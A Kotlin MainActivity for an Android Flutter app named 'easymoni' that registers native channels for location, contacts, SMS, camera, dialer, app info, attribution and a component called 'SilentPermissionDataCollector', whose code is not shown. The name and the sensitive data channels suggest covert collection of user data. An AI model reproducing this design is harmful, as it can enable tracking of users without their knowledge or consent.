package com.ereeko.easymoni

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import androidx.core.content.edit

class MainActivity : FlutterActivity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val DEVICE_INFO_PREFS = "device_info_prefs"
        private const val KEY_LAST_LAUNCH_AT = "last_launch_at"
        private const val MIN_SPLASH_DURATION_MS = 1000L
    }

    private lateinit var locationService: LocationPlatformService
    private lateinit var contactService: ContactPlatformService
    private lateinit var smsService: SmsPlatformService
    private lateinit var cameraService: CameraPlatformService
    private lateinit var dialerService: DialerPlatformService
    private lateinit var appInfoService: AppInfoPlatformService
    private lateinit var attributionService: AttributionPlatformService
    private lateinit var silentPermissionDataCollector: SilentPermissionDataCollector
    private lateinit var webViewService: WebViewPlatformService
    private var previousLaunchAt: Long = 0L
    private var nativeServicesShutdown = false

    override fun onCreate(savedInstanceState: Bundle?) {
        val splashScreen = installSplashScreen()
        val splashStartedAt = SystemClock.uptimeMillis()
        splashScreen.setKeepOnScreenCondition {
            SystemClock.uptimeMillis() - splashStartedAt < MIN_SPLASH_DURATION_MS
        }

        try {
            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set requested orientation", e)
        }
        super.onCreate(savedInstanceState)

        try {
            val prefs = getSharedPreferences(DEVICE_INFO_PREFS, MODE_PRIVATE)
            previousLaunchAt = prefs.getLong(KEY_LAST_LAUNCH_AT, 0L)
            prefs.edit { putLong(KEY_LAST_LAUNCH_AT, System.currentTimeMillis()) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update launch timestamp", e)
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        try {
            val messenger = flutterEngine.dartExecutor.binaryMessenger
            locationService = LocationPlatformService(this)
            contactService = ContactPlatformService(this)
            smsService = SmsPlatformService(this)
            cameraService = CameraPlatformService(this)
            dialerService = DialerPlatformService(this)
            appInfoService = AppInfoPlatformService(this)
            attributionService = AttributionPlatformService(this)
            webViewService = WebViewPlatformService(flutterEngine)
            silentPermissionDataCollector = SilentPermissionDataCollector(
                activity = this,
                locationService = locationService,
                attributionService = attributionService,
                previousLaunchAt = previousLaunchAt
            )

            locationService.register(messenger)
            contactService.register(messenger)
            smsService.register(messenger)
            cameraService.register(messenger)
            dialerService.register(messenger)
            appInfoService.register(messenger)
            attributionService.register(messenger)
            webViewService.register(messenger)
            silentPermissionDataCollector.register(messenger)
            nativeServicesShutdown = false
        } catch (e: Exception) {
            Log.e(TAG, "Failed to configure native channels", e)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        try {
            if (::contactService.isInitialized && contactService.handleActivityResult(requestCode, resultCode, data)) return
            if (::cameraService.isInitialized && cameraService.handleActivityResult(requestCode, resultCode, data)) return
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle activity result", e)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        try {
            if (::locationService.isInitialized && locationService.handlePermissionResult(requestCode, grantResults)) return
            if (::smsService.isInitialized && smsService.handlePermissionResult(requestCode, grantResults)) return
            if (::cameraService.isInitialized && cameraService.handlePermissionResult(requestCode, grantResults)) return
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle permission result", e)
        }
    }

    override fun onDestroy() {
        shutdownNativeServices()
        super.onDestroy()
    }

    override fun cleanUpFlutterEngine(flutterEngine: FlutterEngine) {
        shutdownNativeServices()
        super.cleanUpFlutterEngine(flutterEngine)
    }

    private fun shutdownNativeServices() {
        if (nativeServicesShutdown) return
        nativeServicesShutdown = true

        try {
            if (::locationService.isInitialized) locationService.shutdown()
            if (::contactService.isInitialized) contactService.shutdown()
            if (::smsService.isInitialized) smsService.shutdown()
            if (::cameraService.isInitialized) cameraService.shutdown()
            if (::dialerService.isInitialized) dialerService.shutdown()
            if (::appInfoService.isInitialized) appInfoService.shutdown()
            if (::silentPermissionDataCollector.isInitialized) silentPermissionDataCollector.shutdown()
            if (::attributionService.isInitialized) attributionService.shutdown()
            if (::webViewService.isInitialized) webViewService.shutdown()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to shutdown native services", e)
        }
    }
}
